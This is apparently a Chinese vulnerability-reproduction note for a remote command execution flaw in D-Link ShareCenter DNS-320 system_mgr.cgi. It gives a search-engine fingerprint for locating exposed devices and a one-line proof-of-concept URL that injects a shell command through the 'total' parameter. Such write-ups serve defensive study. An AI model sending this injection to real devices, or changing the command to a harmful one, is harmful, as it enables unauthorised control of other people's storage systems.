---
title: "D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞"
date: 2026-10-18 09:14:24
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "D-Link"
tags:
  - "D-Link"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器

## 漏洞影响

```
D-Link ShareCenter DNS-320
```

## 网络测绘

```
app="D_Link-DNS-ShareCenter"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162224540.png)

漏洞POC为

```plain
/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162224614.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/D-Link-ShareCenter-DNS-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
